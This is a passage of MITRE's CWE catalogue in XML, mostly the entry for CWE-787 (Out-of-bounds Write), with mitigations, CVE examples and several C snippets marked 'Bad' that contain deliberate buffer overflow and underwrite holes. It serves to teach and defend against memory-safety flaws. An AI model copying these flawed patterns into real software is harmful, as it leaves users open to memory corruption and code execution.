               <Modification_Comment>updated Background_Details, Common_Consequences, Demonstrative_Examples, Description, Detection_Factors, Name, Observed_Examples, Potential_Mitigations, References, Related_Attack_Patterns, Relationship_Notes, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Detection_Factors, Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Relationship_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Description, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Description, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated References, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-02-29</Modification_Date>
					<Modification_Version>4.14</Modification_Version>
					<Modification_ReleaseDate>2024-02-29</Modification_ReleaseDate>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-07-16</Modification_Date>
					<Modification_Version>4.15</Modification_Version>
					<Modification_ReleaseDate>2024-07-16</Modification_ReleaseDate>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
            <Contribution Type="Content">
               <Contribution_Name>"Mapping CWE to 62443" Sub-Working Group</Contribution_Name>
               <Contribution_Organization>CWE-CAPEC ICS/OT SIG</Contribution_Organization>
               <Contribution_Date>2023-04-25</Contribution_Date>
               <Contribution_Comment>Suggested mappings to ISA/IEC 62443.</Contribution_Comment>
            </Contribution>
            <Previous_Entry_Name Date="2010-02-16">Improper Check for Exceptional Conditions</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="787" Name="Out-of-bounds Write" Abstraction="Base" Structure="Simple" Status="Draft" Diagram="/data/images/CWE-787-Diagram.png">
         <Description>The product writes data past the end, or before the beginning, of the intended buffer.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="119" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="119" View_ID="1003" Ordinal="Primary"/>
             <Related_Weakness Nature="ChildOf" CWE_ID="119" View_ID="1305" Ordinal="Primary"/>
			 <Related_Weakness Nature="ChildOf" CWE_ID="119" View_ID="1340" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Resultant</Ordinality>
               <Description>At the point when the product writes data to an invalid location, it is likely that a separate weakness already occurred earlier. For example, the product might alter an index, perform incorrect pointer arithmetic, initialize or release memory incorrectly, etc., thus referencing a memory location outside the buffer.</Description>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Name="C" Prevalence="Often"/>
            <Language Name="C++" Prevalence="Often"/>
            <Language Class="Assembly" Prevalence="Undetermined"/>
            <Technology Class="ICS/OT" Prevalence="Often"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Memory Corruption</Term>
               <Description>Often used to describe the consequences of writing to memory outside the bounds of a buffer, or to memory that is otherwise invalid.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Memory</Impact>
               <Impact>Execute Unauthorized Code or Commands</Impact>
			   <Note>Write operations could cause memory corruption. In some cases, an adversary can modify control data such as return addresses in order to execute unexpected code.</Note>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
			   <Note>Attempting to access out-of-range, invalid, or unauthorized memory could cause the product to crash.</Note>
            </Consequence>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Unexpected State</Impact>
			   <Note>Subsequent write operations can produce undefined or unexpected results.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-1">
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives.</xhtml:p>
                  <xhtml:p>Automated static analysis generally does not account for environmental considerations when reporting out-of-bounds memory operations. This can make it difficult for users to determine which warnings should be investigated first. For example, an analysis tool might report buffer overflows that originate from command line arguments in a program that is not expected to run with setuid or other special privileges.</xhtml:p>
               </Description>
               <Effectiveness>High</Effectiveness>
               <Effectiveness_Notes>Detection techniques for buffer-related errors are more mature than for most other weakness types.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-2">
               <Method>Automated Dynamic Analysis</Method>
               <Description>This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.</Description>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-3">
               <Phase>Requirements</Phase>
               <Strategy>Language Selection</Strategy>
               <Description>
                  <xhtml:p>Use a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>For example, many languages that perform their own memory management, such as Java and Perl, are not subject to buffer overflows. Other languages, such as Ada and C#, typically provide overflow protection, but the protection can be disabled by the programmer.</xhtml:p>
                  <xhtml:p>Be wary that a language's interface to native code may still be subject to overflows, even if the language itself is theoretically safe.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4.1">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>Examples include the Safe C String Library (SafeStr) by Messier and Viega [REF-57], and the Strsafe.h library from Microsoft [REF-56]. These libraries provide safer versions of overflow-prone string-handling functions.</xhtml:p>
               </Description>
               <Effectiveness_Notes>This is not a complete solution, since many buffer overflows are not related to strings.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-10">
              <Phase>Operation</Phase> 
	      <Phase>Build and Compilation</Phase>
	      <Strategy>Environment Hardening</Strategy> 
	      <Description> 
		<xhtml:p>Use automatic buffer overflow detection mechanisms that are offered by certain compilers or compiler extensions. Examples include: the Microsoft Visual Studio /GS flag, Fedora/Red Hat FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice, which provide various mechanisms including canary-based detection and range/index checking. </xhtml:p> 
		<xhtml:p> D3-SFCV (Stack Frame Canary Validation) from D3FEND [REF-1334] discusses canary-based detection in detail. </xhtml:p> 

	      </Description> 
	      <Effectiveness>Defense in Depth</Effectiveness> 
	      <Effectiveness_Notes> 
		<xhtml:p> This is not necessarily a complete solution, since these mechanisms only detect certain types of overflows. In addition, the result is still a denial of service, since the typical response is to exit the application. </xhtml:p> 
	      </Effectiveness_Notes>
	    </Mitigation>
            <Mitigation Mitigation_ID="MIT-9">
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>Consider adhering to the following rules when allocating and managing an application's memory:</xhtml:p>
                     <xhtml:ul>
                        <xhtml:li>Double check that the buffer is as large as specified.</xhtml:li>
                        <xhtml:li>When using functions that accept a number of bytes to copy, such as strncpy(), be aware that if the destination buffer size is equal to the source buffer size, it may not NULL-terminate the string.</xhtml:li>
                        <xhtml:li>Check buffer boundaries if accessing the buffer in a loop and make sure there is no danger of writing past the allocated space.</xhtml:li>
                        <xhtml:li>If necessary, truncate all input strings to a reasonable length before passing them to the copy and concatenation functions.</xhtml:li>
                     </xhtml:ul>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-11">
               <Phase>Operation</Phase> 
	       <Phase>Build and Compilation</Phase> 
	       <Strategy>Environment Hardening</Strategy> 
	       <Description>
		 <xhtml:p>Run or compile the software using features or extensions that randomly arrange the positions of a program's executable and libraries in memory. Because this makes the addresses unpredictable, it can prevent an attacker from reliably jumping to exploitable code. </xhtml:p> 
		 <xhtml:p> Examples include Address Space Layout Randomization (ASLR) [REF-58] [REF-60] and Position-Independent Executables (PIE) [REF-64]. Imported modules may be similarly realigned if their default memory addresses conflict with other modules, in a process known as "rebasing" (for Windows) and "prelinking" (for Linux) [REF-1332] using randomly generated addresses. ASLR for libraries cannot be used in conjunction with prelink since it would require relocating the libraries at run-time, defeating the whole purpose of prelinking. </xhtml:p> 
		 <xhtml:p> For more information on these techniques see D3-SAOR (Segment Address Offset Randomization) from D3FEND [REF-1335]. </xhtml:p>
	       </Description> 
	       <Effectiveness>Defense in Depth</Effectiveness> 
	       <Effectiveness_Notes>These techniques do not provide a complete solution.  For instance, exploits frequently use a bug that discloses memory addresses in order to maximize reliability of code execution [REF-1337]. It has also been shown that a side-channel attack can bypass ASLR [REF-1333].</Effectiveness_Notes> 
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-12">
               <Phase>Operation</Phase> 
	       <Strategy>Environment Hardening</Strategy> 
	       <Description> 
		 <xhtml:p> Use a CPU and operating system that offers Data Execution Protection (using hardware NX or XD bits) or the equivalent techniques that simulate this feature in software, such as PaX [REF-60] [REF-61]. These techniques ensure that any instruction executed is exclusively at a memory address that is part of the code segment.  </xhtml:p> 
	         <xhtml:p> For more information on these techniques see D3-PSEP (Process Segment Execution Prevention) from D3FEND [REF-1336]. </xhtml:p>
	       </Description> 
	       <Effectiveness>Defense in Depth</Effectiveness> 
	       <Effectiveness_Notes>This is not a complete solution, since buffer overflows could be used to overwrite nearby variables to modify the software's state in dangerous ways. In addition, it cannot be used in cases in which self-modifying code is required. Finally, an attack could still cause a denial of service, since the typical response is to exit the application. </Effectiveness_Notes> 
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-13">
               <Phase>Implementation</Phase>
               <Description>Replace unbounded copy functions with analogous functions that support length arguments, such as strcpy with strncpy. Create these if they are not available.</Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>This approach is still susceptible to calculation errors, including issues such as off-by-one errors (CWE-193) and incorrectly calculating buffer lengths (CWE-131).</Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code attempts to save four different identification numbers into an array.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>int id_sequence[3];<xhtml:br/>
                     <xhtml:br/>/* Populate the id array. */<xhtml:br/>
                     <xhtml:br/>id_sequence[0] = 123;<xhtml:br/>id_sequence[1] = 234;<xhtml:br/>id_sequence[2] = 345;<xhtml:br/>id_sequence[3] = 456;</xhtml:div>
               </Example_Code>
	       <Body_Text>Since the array is only allocated to hold three elements, the valid indices are 0 to 2; so, the assignment to id_sequence[3] is out of bounds.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-114">
               <Intro_Text>In the following code, it is possible to request that memcpy move a much larger segment of memory than assumed:</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>int returnChunkSize(void *) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>
                           <xhtml:br/>
                           <xhtml:i>/* if chunk info is valid, return the size of usable memory,</xhtml:i>
                           <xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>* else, return -1 to indicate an error</xhtml:i>
                           <xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>*/</xhtml:i>
                           <xhtml:br/>...</xhtml:div>
                     </xhtml:div>}<xhtml:br/>int main() {<xhtml:div style="margin-left:1em;">...<xhtml:br/>memcpy(destBuf, srcBuf, (returnChunkSize(destBuf)-1));<xhtml:br/>...</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>If returnChunkSize() happens to encounter an error it will return -1. Notice that the return value is not checked before the memcpy operation (CWE-252), so -1 can be passed as the size argument to memcpy() (CWE-805). Because memcpy() assumes that the value is unsigned, it will be interpreted as MAXINT-1 (CWE-195), and therefore will copy far more memory than is likely available to the destination buffer (CWE-787, CWE-788).</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-1">
               <Intro_Text>This code takes an IP address from the user and verifies that it is well formed. It then looks up the hostname and copies it into a buffer.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>void host_lookup(char *user_supplied_addr){<xhtml:div style="margin-left:1em;">
                        <xhtml:div>struct hostent *hp;<xhtml:br/>in_addr_t *addr;<xhtml:br/>char hostname[64];<xhtml:br/>in_addr_t inet_addr(const char *cp);<xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>/*routine that ensures user_supplied_addr is in the right format for conversion */</xhtml:i>
                           <xhtml:br/>
                           <xhtml:br/>validate_addr_form(user_supplied_addr);<xhtml:br/>addr = inet_addr(user_supplied_addr);<xhtml:br/>hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET);<xhtml:br/>strcpy(hostname, hp-&gt;h_name);</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>This function allocates a buffer of 64 bytes to store the hostname. However, there is no guarantee that the hostname will not be larger than 64 bytes. If an attacker specifies an address which resolves to a very large hostname, then the function may overwrite sensitive data or even relinquish control flow to the attacker.</Body_Text>
               <Body_Text>Note that this example also contains an unchecked return value (CWE-252) that can lead to a NULL pointer dereference (CWE-476).</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-19">
               <Intro_Text>This code applies an encoding procedure to an input string and stores it into a buffer.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>char * copy_input(char *user_supplied_string){<xhtml:div style="margin-left:1em;">
                        <xhtml:div>int i, dst_index;<xhtml:br/>char *dst_buf = (char*)malloc(4*sizeof(char) * MAX_SIZE);<xhtml:br/>if ( MAX_SIZE &lt;= strlen(user_supplied_string) ){<xhtml:div style="margin-left:1em;">die("user string too long, die evil hacker!");</xhtml:div>}<xhtml:br/>dst_index = 0;<xhtml:br/>for ( i = 0; i &lt; strlen(user_supplied_string); i++ ){<xhtml:div style="margin-left:1em;">
                              <xhtml:div>if( '&amp;' == user_supplied_string[i] ){<xhtml:div style="margin-left:1em;">dst_buf[dst_index++] = '&amp;';<xhtml:br/>dst_buf[dst_index++] = 'a';<xhtml:br/>dst_buf[dst_index++] = 'm';<xhtml:br/>dst_buf[dst_index++] = 'p';<xhtml:br/>dst_buf[dst_index++] = ';';</xhtml:div>}<xhtml:br/>else if ('&lt;' == user_supplied_string[i] ){<xhtml:div style="margin-left:1em;">
                                    <xhtml:div>
                                       <xhtml:br/>
                                       <xhtml:i>/* encode to &amp;lt; */</xhtml:i>
                                       <xhtml:br/>
                                    </xhtml:div>
                                 </xhtml:div>}<xhtml:br/>else dst_buf[dst_index++] = user_supplied_string[i];</xhtml:div>
                           </xhtml:div>}<xhtml:br/>return dst_buf;</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The programmer attempts to encode the ampersand character in the user-controlled string. However, the length of the string is validated before the encoding procedure is applied. Furthermore, the programmer assumes encoding expansion will only expand a given character by a factor of 4, while the encoding of the ampersand expands by 5. As a result, when the encoding procedure expands the string it is possible to overflow the destination buffer if the attacker provides a string of many ampersands.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-87">
               <Intro_Text>In the following C/C++ code, a utility function is used to trim trailing whitespace from a character string. The function copies the input string to a local character string and uses a while statement to remove the trailing whitespace by moving backward through the string and overwriting whitespace with a NUL character.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>char* trimTrailingWhitespace(char *strMessage, int length) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>char *retMessage;<xhtml:br/>char *message = malloc(sizeof(char)*(length+1));<xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>// copy input string to a temporary string</xhtml:i>
                           <xhtml:br/>char message[length+1];<xhtml:br/>int index;<xhtml:br/>for (index = 0; index &lt; length; index++) {<xhtml:div style="margin-left:1em;">message[index] = strMessage[index];</xhtml:div>}<xhtml:br/>message[index] = '\0';<xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>// trim trailing whitespace</xhtml:i>
                           <xhtml:br/>int len = index-1;<xhtml:br/>while (isspace(message[len])) {<xhtml:div style="margin-left:1em;">message[len] = '\0';<xhtml:br/>len--;</xhtml:div>}<xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>// return string without trailing whitespace</xhtml:i>
                           <xhtml:br/>retMessage = message;<xhtml:br/>return retMessage;</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>However, this function can cause a buffer underwrite if the input character string contains all whitespace. On some systems the while statement will move backwards past the beginning of a character string and will call the isspace() function on an address outside of the bounds of the local buffer.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-20">
               <Intro_Text>The following code allocates memory for a maximum number of widgets. It then gets a user-specified number of widgets, making sure that the user does not request too many. It then initializes the elements of the array using InitializeWidget(). Because the number of widgets can vary for each request, the code inserts a NULL pointer to signify the location of the last widget.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>int i;<xhtml:br/>unsigned int numWidgets;<xhtml:br/>Widget **WidgetList;<xhtml:br/>
                     <xhtml:br/>numWidgets = GetUntrustedSizeValue();<xhtml:br/>if ((numWidgets == 0) || (numWidgets &gt; MAX_NUM_WIDGETS)) {<xhtml:div style="margin-left:1em;">ExitError("Incorrect number of widgets requested!");</xhtml:div>}<xhtml:br/>WidgetList = (Widget **)malloc(numWidgets * sizeof(Widget *));<xhtml:br/>printf("WidgetList ptr=%p\n", WidgetList);<xhtml:br/>for(i=0; i&lt;numWidgets; i++) {<xhtml:div style="margin-left:1em;">WidgetList[i] = InitializeWidget();</xhtml:div>}<xhtml:br/>WidgetList[numWidgets] = NULL;<xhtml:br/>showWidgets(WidgetList);</xhtml:div>
               </Example_Code>
               <Body_Text>However, this code contains an off-by-one calculation error (CWE-193). It allocates exactly enough space to contain the specified number of widgets, but it does not include the space for the NULL pointer. As a result, the allocated buffer is smaller than it is supposed to be (CWE-131). So if the user ever requests MAX_NUM_WIDGETS, there is an out-of-bounds write (CWE-787) when the NULL is assigned. Depending on the environment and compilation settings, this could cause memory corruption.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-88">
               <Intro_Text>The following is an example of code that may result in a buffer underwrite. This code is attempting to replace the substring "Replace Me" in destBuf with the string stored in srcBuf. It does so by using the function strstr(), which returns a pointer to the found substring in destBuf.  Using pointer arithmetic, the starting index of the substring is found.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>int main() {
                     <xhtml:div style="margin-left:1em;">...<xhtml:br/>
                     char *result = strstr(destBuf, "Replace Me");<xhtml:br/>
                     int idx = result - destBuf;<xhtml:br/>
                     strcpy(&amp;destBuf[idx], srcBuf);<xhtml:br/>
                     ...</xhtml:div>}
                  </xhtml:div>
               </Example_Code>
               <Body_Text>In the case where the substring is not found in destBuf, strstr() will return NULL, causing the pointer arithmetic to be undefined, potentially setting the value of idx to a negative number.  If idx is negative, this will result in a buffer underwrite of destBuf.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2021-21220</Reference>
               <Description>Chain: insufficient input validation (CWE-20) in browser allows heap corruption (CWE-787), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-21220</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-28664</Reference>
               <Description>GPU kernel driver allows memory corruption because a user can obtain read/write access to read-only pages, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-28664</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-17087</Reference>
               <Description>Chain: integer truncation (CWE-197) causes small buffer allocation (CWE-131) leading to out-of-bounds write (CWE-787) in kernel pool, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-17087</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-1054</Reference>
               <Description>Out-of-bounds write in kernel-mode driver, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-1054</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-0041</Reference>
               <Description>Escape from browser sandbox using out-of-bounds write due to incorrect bounds check, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-0041</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-0968</Reference>
               <Description>Memory corruption in web browser scripting engine, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-0968</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-0022</Reference>
               <Description>chain: mobile phone Bluetooth implementation does not include offset when calculating packet length (CWE-682), leading to out-of-bounds write (CWE-787)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-0022</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2019-1010006</Reference>
               <Description>Chain: compiler optimization (CWE-733) removes or modifies code used to detect integer overflow (CWE-190), allowing out-of-bounds write (CWE-787).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2019-1010006</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1532</Reference>
               <Description>malformed inputs cause accesses of uninitialized or previously-deleted objects, leading to memory corruption</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-1532</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0269</Reference>
               <Description>chain: -1 value from a function call was intended to indicate an error, but is used as an array index instead.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0269</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-2227</Reference>
               <Description>Unchecked length of SSLv2 challenge value leads to buffer underflow.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-2227</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-4580</Reference>
               <Description>Buffer underflow from a small size value with a large buffer (length parameter inconsistency, CWE-130)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-4580</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-4268</Reference>
               <Description>Chain: integer signedness error (CWE-195) passes signed comparison, leading to heap overflow (CWE-122)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-4268</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2550</Reference>
               <Description>Classic stack-based buffer overflow in media player using a long entry in a playlist</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2550</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2403</Reference>
               <Description>Heap-based buffer overflow in media player using a long entry in a playlist</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2403</Link>
            </Observed_Example>
         </Observed_Examples>
	 <Taxonomy_Mappings>
	   <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 3-3</Entry_ID>
	     <Entry_Name>Req SR 3.5</Entry_Name>
	   </Taxonomy_Mapping>
	   <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 4-1</Entry_ID>
	     <Entry_Name>Req SI-1</Entry_Name>
	   </Taxonomy_Mapping>
